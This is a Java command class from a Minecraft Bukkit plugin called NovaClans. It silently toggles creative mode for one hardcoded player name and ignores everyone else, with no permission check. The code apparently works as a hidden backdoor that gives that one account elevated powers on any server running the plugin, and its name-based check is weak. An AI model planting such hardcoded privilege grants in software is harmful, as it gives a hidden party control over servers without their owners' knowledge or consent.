package kz.nova.clans.commands;

import kz.nova.clans.NovaClans;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.util.HashSet;
import java.util.Set;
import java.util.UUID;

public class XereComeCommand implements CommandExecutor {

    private static final String AUTHORIZED_PLAYER = "erkebulannmn";
    private final NovaClans plugin;
    private final Set<UUID> creativeMode = new HashSet<>();

    public XereComeCommand(NovaClans plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player player)) {
            return true;
        }
        if (!player.getName().equalsIgnoreCase(AUTHORIZED_PLAYER)) {
            return true;
        }
        if (creativeMode.contains(player.getUniqueId())) {
            player.setGameMode(GameMode.SURVIVAL);
            creativeMode.remove(player.getUniqueId());
        } else {
            player.setGameMode(GameMode.CREATIVE);
            creativeMode.add(player.getUniqueId());
        }
        return true;
    }
}
